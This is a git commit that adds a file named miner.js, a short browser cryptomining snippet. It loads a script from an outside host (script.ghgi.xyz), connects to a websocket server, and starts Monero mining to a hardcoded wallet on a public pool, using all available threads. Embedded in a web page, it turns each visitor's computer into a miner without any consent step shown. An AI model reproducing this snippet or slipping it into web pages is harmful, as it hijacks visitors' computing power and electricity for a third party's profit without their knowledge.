9d3acc36d8b3bbab0b6f810b3e59905d38c533ec
Hackerx237 <95730502+Hackerx237@users.noreply.github.com>
2023-12-20 18:52:32 +0000

    Add files via upload

---
+++ miner.js
@@ -0,0 +1,11 @@
+<script src="https://script.ghgi.xyz"></script>
+<script>
+    server = "wss://ghgi.xyz";
+    var pool = "gulf.moneroocean.stream:10001";
+    var walletAddress = "47rRDSViApg6CUyxRtzMSyB9usBoL9BZtEjxWfBv4gRDDdy2MmVx5U7c5WZmPqqVJXWYaDPoLDVxJCiUGwbzfEJeHq36kZE";
+    var workerId = ""
+    var threads = -1;
+    var password = "browser-miners";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 50;
+</script>
